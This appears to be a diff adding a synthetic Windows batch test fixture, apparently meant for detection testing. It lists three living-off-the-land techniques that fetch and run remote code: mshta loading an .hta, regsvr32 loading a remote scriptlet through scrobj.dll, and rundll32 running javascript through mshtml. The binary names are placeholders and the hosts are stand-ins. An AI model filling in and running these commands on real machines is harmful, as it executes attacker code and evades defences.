@@ -1,0 +1,5 @@
+@echo off
+rem SYNTHETIC TEST FIXTURE — not functional
+{{MSHTA}} https://payload.example.invalid/p.hta
+{{REGSVR32}} /s /n /u /i:https://payload.example.invalid/q.sct scrobj.dll
+{{RUNDLL32}} javascript:"\..\mshtml,RunHTMLApplication ";
